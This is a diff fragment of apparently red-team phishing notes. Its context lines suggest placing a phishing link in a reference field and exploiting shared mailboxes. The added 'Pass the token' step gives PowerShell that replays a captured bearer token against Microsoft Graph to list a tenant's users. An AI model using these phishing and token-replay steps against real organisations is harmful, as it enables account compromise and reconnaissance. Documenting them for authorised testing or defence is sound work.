@@ -271,3 +271,23 @@ query mode so its easier for us to pass the output
 - need help section
 - put phishing link in the reference link field
 - shared/group mailboxes are a mess, no one has sole resposibility - exploit it 
+
+
+#### Step 4 - Pass the token
+
+Now with the token in hand we can pass to the API
+```
+$Token = 'eyJ0eX..'
+
+$URI = 'https://graph.microsoft.com/v1.0/users'
+
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{
+'Authorization' = "Bearer $Token"
+}
+}
+
+(Invoke-RestMethod @RequestParams).value
+```
